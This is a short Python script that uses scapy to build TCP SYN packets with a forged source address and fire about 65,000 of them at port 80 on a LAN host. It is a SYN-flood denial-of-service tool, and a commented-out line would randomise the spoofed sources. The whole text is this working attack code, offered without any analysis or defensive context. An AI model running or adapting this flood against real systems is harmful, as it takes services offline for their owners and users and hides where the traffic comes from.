import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import time
from scapy.all import *

seq = 54545
sport = 49153
dport = 80

packet_sent_count = 0
for i in range(0,255):
	for j in range(0,255):
		# random_ip = '15.12.' + str(i) + '.' + str(j)
		random_ip = '15.12.4.151'
		ip = IP(src=random_ip,dst='192.168.0.103')
		syn = TCP(sport=sport, dport=dport, flags='S', seq=seq)
		packet = ip/syn
		send(packet,iface="wlan0")
		packet_sent_count = packet_sent_count + 1
		if(packet_sent_count % 100 == 0):
			print "Syn packet sent " + str(packet_sent_count)